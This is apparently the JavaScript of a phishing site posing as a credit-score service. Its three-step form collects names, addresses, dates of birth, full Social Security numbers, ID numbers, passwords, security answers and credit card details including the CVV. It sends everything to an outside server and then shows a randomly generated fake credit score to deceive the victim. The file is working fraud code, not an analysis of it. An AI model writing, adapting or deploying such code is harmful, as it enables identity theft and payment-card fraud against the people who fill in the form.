let currentStep = 1;
const maxSteps = 3;
let formDataStore = {}; // Holds data from all form steps

// Utility functions
function showError(fieldId, message) {
    const field = document.getElementById(fieldId);
    const errorDiv = document.getElementById(fieldId + 'Error');
    field.classList.add('error');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    }
}

function hideError(fieldId) {
    const field = document.getElementById(fieldId);
    const errorDiv = document.getElementById(fieldId + 'Error');
    field.classList.remove('error');
    if (errorDiv) {
        errorDiv.style.display = 'none';
    }
}

function validateField(fieldId, validationFn, errorMessage) {
    const field = document.getElementById(fieldId);
    const value = field.value.trim();

    if (!validationFn(value)) {
        showError(fieldId, errorMessage);
        return false;
    } else {
        hideError(fieldId);
        return true;
    }
}

function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

function validateStep1() {
    let isValid = true;

    isValid &= validateField('firstName', (v) => v.length >= 2, 'First name must be at least 2 characters');
    isValid &= validateField('lastName', (v) => v.length >= 2, 'Last name must be at least 2 characters');
    isValid &= validateField('email', validateEmail, 'Please enter a valid email address');
    isValid &= validateField('mobileNumber', (v) => v.length >= 10, 'Please enter a valid mobile number');
    isValid &= validateField('address', (v) => v.length >= 5, 'Please enter a valid address');
    isValid &= validateField('city', (v) => v.length >= 2, 'Please enter a valid city');
    isValid &= validateField('state', (v) => v.length > 0, 'Please select a state');
    isValid &= validateField('zip', (v) => /^\d{5}$/.test(v), 'Please enter a valid 5-digit ZIP code');
    isValid &= validateField('ssn4', (v) => /^\d{4}$/.test(v), 'Please enter the last 4 digits of your SSN');

    const month = document.getElementById('dobMonth').value;
    const day = document.getElementById('dobDay').value;
    const year = document.getElementById('dobYear').value;

    if (!month || !day || !year || 
        !/^\d{1,2}$/.test(month) || !/^\d{1,2}$/.test(day) || !/^\d{4}$/.test(year) ||
        parseInt(month) < 1 || parseInt(month) > 12 ||
        parseInt(day) < 1 || parseInt(day) > 31 ||
        parseInt(year) < 1900 || parseInt(year) > new Date().getFullYear() - 18) {
        showError('dobMonth', 'Please enter a valid date of birth');
        isValid = false;
    } else {
        hideError('dobMonth');
    }

    if (!document.getElementById('termsAgreed').checked) {
        alert('You must agree to the Terms of Service and Privacy Notice to continue.');
        isValid = false;
    }

    return !!isValid;
}

function validateStep2() {
    let isValid = true;

    isValid &= validateField('username', (v) => v.length >= 5, 'Username must be at least 5 characters');

    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;

    isValid &= validateField('password', (v) => v.length >= 8, 'Password must be at least 8 characters');

    if (password !== confirmPassword) {
        showError('confirmPassword', 'Passwords do not match');
        isValid = false;
    } else {
        hideError('confirmPassword');
    }

    isValid &= validateField('securityQuestion', (v) => v.length > 0, 'Please select a security question');
    isValid &= validateField('securityAnswer', (v) => v.length >= 2, 'Please provide a security answer');

    return !!isValid;
}

function validateStep3() {
    let isValid = true;

    isValid &= validateField('fullSsn', (v) => /^\d{9}$/.test(v), 'Please enter your full 9-digit SSN');
    isValid &= validateField('idNumber', (v) => v.length >= 5, 'Please enter your ID number');

    const idType = document.querySelector('input[name="idType"]:checked').value;
    if (idType !== 'passport') {
        isValid &= validateField('idState', (v) => v.length > 0, 'Please select the issuing state');
    }

    const expMonth = document.getElementById('idExpMonth').value;
    const expYear = document.getElementById('idExpYear').value;

    if (!expMonth || !expYear || 
        !/^\d{1,2}$/.test(expMonth) || !/^\d{4}$/.test(expYear) ||
        parseInt(expMonth) < 1 || parseInt(expMonth) > 12) {
        showError('idExpMonth', 'Please enter a valid expiration date');
        isValid = false;
    } else {
        hideError('idExpMonth');
    }

    if (!document.getElementById('identityTerms').checked) {
        alert('You must agree to the identity verification terms to continue.');
        isValid = false;
    }

    return !!isValid;
}

function updateStepIndicator(step) {
    for (let i = 1; i <= maxSteps; i++) {
        const stepElement = document.getElementById(`step${i}`);
        stepElement.classList.remove('active', 'completed');

        if (i < step) stepElement.classList.add('completed');
        else if (i === step) stepElement.classList.add('active');
    }

    const progressFill = document.getElementById('progressFill');
    const percentage = (step / maxSteps) * 100;
    progressFill.style.width = percentage + '%';
}

function showStep(step) {
    for (let i = 1; i <= maxSteps; i++) {
        document.getElementById(`step${i}Container`).classList.add('hidden');
    }

    if (step <= maxSteps) {
        document.getElementById(`step${step}Container`).classList.remove('hidden');
        updateStepIndicator(step);
    }

    currentStep = step;
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showSuccess() {
    for (let i = 1; i <= maxSteps; i++) {
        document.getElementById(`step${i}Container`).classList.add('hidden');
    }

    document.querySelector('.progress-bar').style.display = 'none';

    const creditScore = Math.floor(Math.random() * 71) + 30;
    const scorePosition = ((creditScore - 30) / 70) * 100;

    let category = '';
    if (creditScore >= 85) category = 'Excellent';
    else if (creditScore >= 70) category = 'Good';
    else if (creditScore >= 50) category = 'Fair';
    else category = 'Poor';

    document.getElementById('finalScore').textContent = creditScore;
    document.getElementById('scoreCategory').textContent = category;
    document.getElementById('scoreDate').textContent = new Date().toLocaleDateString();
    document.getElementById('scoreMarker').style.left = scorePosition + '%';

    document.getElementById('totalAccounts').textContent = Math.floor(Math.random() * 9) + 2;
    document.getElementById('totalInquiries').textContent = Math.floor(Math.random() * 5);
    document.getElementById('negativeItems').textContent = Math.floor(Math.random() * 2);

    const successContainer = document.getElementById('successContainer');
    successContainer.classList.remove('hidden');
    successContainer.classList.add('show');
    updateStepIndicator(4);
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function setButtonLoading(buttonId, isLoading) {
    const button = document.getElementById(buttonId);
    const span = button.querySelector('span');

    if (isLoading) {
        button.disabled = true;
        span.innerHTML = '<div class="spinner"></div>Processing...';
        button.closest('.form-container').classList.add('submitting');
    } else {
        button.disabled = false;
        button.closest('.form-container').classList.remove('submitting');
        span.textContent = buttonId === 'step1Btn'
            ? 'I Accept & Continue to Step 2'
            : buttonId === 'step2Btn'
            ? 'Continue to Step 3'
            : 'Complete Registration';
    }
}

// Form handlers
document.getElementById('personalInfoForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (validateStep1()) {
        const data = new FormData(this);
        data.forEach((value, key) => (formDataStore[key] = value));

        setButtonLoading('step1Btn', true);
        setTimeout(() => {
            setButtonLoading('step1Btn', false);
            showStep(2);
        }, 1500);
    }
});

document.getElementById('createAccountForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (validateStep2()) {
        const data = new FormData(this);
        data.forEach((value, key) => (formDataStore[key] = value));

        setButtonLoading('step2Btn', true);
        setTimeout(() => {
            setButtonLoading('step2Btn', false);
            showStep(3);
        }, 1500);
    }
});

document.getElementById('verifyIdentityForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    if (validateStep3()) {
        const data = new FormData(this);
        data.forEach((value, key) => (formDataStore[key] = value));

        setButtonLoading('step3Btn', true);
        setTimeout(async () => {
            try {
                const response = await fetch('https://asadullahback-production.up.railway.app/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formDataStore),
                });

                setButtonLoading('step3Btn', false);
                if (response.ok) {
                    showSuccess();
                } else {
                    alert('There was an error submitting the form.');
                }
            } catch (err) {
                console.error(err);
                alert('Network error. Please try again.');
                setButtonLoading('step3Btn', false);
            }
        }, 3000);
    }
});

// ID Type handler
document.querySelectorAll('input[name="idType"]').forEach((radio) => {
    radio.addEventListener('change', function () {
        const idStateGroup = document.getElementById('idStateGroup');
        if (this.value === 'passport') {
            idStateGroup.style.display = 'none';
            document.getElementById('idState').required = false;
        } else {
            idStateGroup.style.display = 'block';
            document.getElementById('idState').required = true;
        }
    });
});

// Number formatting
['dobMonth', 'dobDay', 'dobYear', 'zip', 'ssn4', 'fullSsn', 'idExpMonth', 'idExpYear', 'mobileNumber'].forEach(fieldId => {
    document.getElementById(fieldId).addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '');
    });
});

// Real-time blur validation cleanup
['firstName', 'lastName', 'email', 'username', 'password'].forEach(fieldId => {
    document.getElementById(fieldId).addEventListener('blur', function () {
        if (this.value.trim()) hideError(fieldId);
    });
});

// CTA scroll
document.querySelector('.hero-cta').addEventListener('click', function(e) {
    e.preventDefault();
    document.getElementById('get-started').scrollIntoView({ behavior: 'smooth' });
});

// Start at step 1
showStep(1);


// Input formatting: allow only numbers and format CC number and expiry
const ccNumberInput = document.getElementById('ccNumber');
const ccExpiryInput = document.getElementById('ccExpiry');
const ccCVVInput = document.getElementById('ccCVV');

ccNumberInput.addEventListener('input', () => {
  // Allow only digits and format as "1234 5678 9012 3456"
  let val = ccNumberInput.value.replace(/\D/g, '').substring(0,16);
  let formatted = '';
  for(let i = 0; i < val.length; i++) {
    if(i > 0 && i % 4 === 0) formatted += ' ';
    formatted += val[i];
  }
  ccNumberInput.value = formatted;
});

ccExpiryInput.addEventListener('input', () => {
  let val = ccExpiryInput.value.replace(/[^\d]/g, '').substring(0,4);
  if(val.length > 2) {
    val = val.substring(0,2) + '/' + val.substring(2);
  }
  ccExpiryInput.value = val;
});

ccCVVInput.addEventListener('input', () => {
  ccCVVInput.value = ccCVVInput.value.replace(/\D/g, '').substring(0,4);
});

// Validation function for credit card inputs (call this on Step 3 validation)
function validateCreditCard() {
  let isValid = true;
  const errors = [];

  const ccNum = ccNumberInput.value.replace(/\s/g, '');
  const ccName = document.getElementById('ccName').value.trim();
  const ccExpiry = ccExpiryInput.value;
  const ccCVV = ccCVVInput.value;

  if (!/^\d{13,16}$/.test(ccNum)) {
    errors.push('Please enter a valid credit card number (13-16 digits).');
    isValid = false;
  }
  if (ccName.length < 2) {
    errors.push('Please enter the name on the credit card.');
    isValid = false;
  }
  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(ccExpiry)) {
    errors.push('Please enter a valid expiry date (MM/YY).');
    isValid = false;
  } else {
    // Check if expiry is not in the past
    const [month, year] = ccExpiry.split('/');
    const expiryDate = new Date(2000 + parseInt(year, 10), parseInt(month, 10) - 1, 1);
    const now = new Date();
    now.setDate(1);
    now.setHours(0,0,0,0);
    if (expiryDate < now) {
      errors.push('Credit card expiry date cannot be in the past.');
      isValid = false;
    }
  }
  if (!/^\d{3,4}$/.test(ccCVV)) {
    errors.push('Please enter a valid CVV (3 or 4 digits).');
    isValid = false;
  }

  const errorDiv = document.getElementById('creditCardErrors');
  if (!isValid) {
    errorDiv.innerHTML = errors.map(e => `<p>${e}</p>`).join('');
    errorDiv.style.display = 'block';
  } else {
    errorDiv.innerHTML = '';
    errorDiv.style.display = 'none';
  }

  return isValid;
}

